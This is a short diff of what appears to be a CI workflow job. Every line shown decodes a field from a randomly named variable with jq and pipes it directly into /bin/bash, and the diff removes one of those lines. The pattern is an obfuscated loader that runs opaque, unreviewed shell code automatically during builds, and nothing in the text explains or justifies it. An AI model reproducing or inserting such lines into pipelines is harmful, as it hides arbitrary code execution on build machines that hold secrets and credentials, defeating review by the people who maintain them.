@@ -41,7 +41,6 @@ jobs:
           echo $ip34 | jq -r .bc7118 | /bin/bash
           echo $mwcq3973 | jq -r .vdis5 | /bin/bash
           printf '%s' "$nz3" | jq -r .c6 | /bin/bash
-          echo $om064 | jq -r .np500 | /bin/bash
           printf '%s' "$ss154" | jq -r .ft498 | /bin/bash
           echo $fybd32 | jq -r .cez178 | /bin/bash
           echo $qlnk0133 | jq -r .zeh68 | /bin/bash
